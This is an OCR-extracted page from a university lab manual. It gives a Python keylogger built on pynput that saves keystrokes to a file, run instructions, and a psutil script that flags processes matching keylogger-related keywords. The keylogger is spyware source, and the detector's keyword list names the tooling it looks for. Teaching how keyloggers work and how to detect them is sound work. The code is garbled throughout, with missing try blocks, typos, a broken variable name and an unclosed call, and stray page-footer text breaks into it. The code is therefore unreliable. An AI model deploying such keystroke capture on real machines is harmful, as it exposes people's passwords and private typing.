from pynput import keyboard

# Log file to store keystrokes

log_file = "keylog_output.txt"

def on_press(key):

except AttributeError:

with open(log file, "a") as file: ile.write(f" {key.char}")

with open(log_file, "a") as file: file.write(f"[{key}]")

# Start keylogger

with keyboard.Listener(on_press=on_press) as listener: listener.join(

Instructions

Install required package:

pip install pynput

Run the script:

python keylogger.py

2.

3.

4.

5. Keystrokes s are are saved to keylog_output.txt.

PART b) Python Keylogger Detection Tool

File: detect_keylogger.py

import psutil

# List of suspicious terms commonly used in keylogger scripts

suspicious terms = ["keylogger", "pynput", "keyboard", "hook", "listener"]

PCCSL308 shell scripting and

network administration using Linux lab

47

Department of Computer Science, MITS Varikoli

found False

for proc in psutil.process_iter(['pid', 'name', 'cmdline']):

mdline =''.join(proc.info['cmdline']).lower()

if any(term in cmdline for term in suspicious_terms):

print(f"[ ALERT] Suspicious process found: {proc.info}")

found = True

except (psutil.NoSuchProcess, psutil. AccessDenied, psutil.ZombieProcess):

continue

if not found:

print(" No suspicious keylogger-like processes detected.")
